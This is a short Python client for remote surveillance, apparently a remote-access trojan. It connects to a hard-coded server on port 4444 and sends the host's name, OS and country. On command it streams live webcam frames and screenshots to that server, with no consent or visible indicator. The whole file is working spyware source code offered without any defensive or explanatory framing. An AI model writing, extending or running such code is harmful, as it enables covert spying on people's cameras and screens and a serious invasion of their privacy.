import socket
import cv2
import pyautogui
import struct
import pickle
import platform
import requests
import threading
import time

SERVER_IP = "10.0.1.33"  # Replace with the actual server IP
SERVER_PORT = 4444

def get_system_info():
    """Fetch system information like OS and country."""
    os_info = platform.platform()
    try:
        ip_info = requests.get("http://ipinfo.io").json()
        country = ip_info.get("country", "Unknown")
    except:
        country = "Unknown"
    return os_info, country

def send_webcam_data(sock):
    """Send live webcam frames to the server."""
    cap = cv2.VideoCapture(0)
    while True:
        ret, frame = cap.read()
        if not ret:
            break
        _, buffer = cv2.imencode('.jpg', frame)
        data = pickle.dumps(buffer)
        sock.sendall(struct.pack("Q", len(data)) + data)
    cap.release()

def send_screenshots(sock):
    """Send live screenshots to the server."""
    while True:
        screenshot = pyautogui.screenshot()
        _, buffer = cv2.imencode('.jpg', screenshot)
        data = pickle.dumps(buffer)
        sock.sendall(struct.pack("Q", len(data)) + data)
        time.sleep(0.5)  # Adjust for frame rate

def handle_server_commands(sock):
    """Handle commands received from the server."""
    while True:
        cmd = sock.recv(1024).decode()
        if cmd == "kill":
            sock.close()
            break
        elif cmd == "webcam":
            send_webcam_data(sock)
        elif cmd == "screenshot":
            send_screenshots(sock)

def main():
    """Main client logic."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((SERVER_IP, SERVER_PORT))
    os_info, country = get_system_info()
    sock.send(f"{socket.gethostname()}|{os_info}|{country}".encode())
    handle_server_commands(sock)

if __name__ == "__main__":
    main()
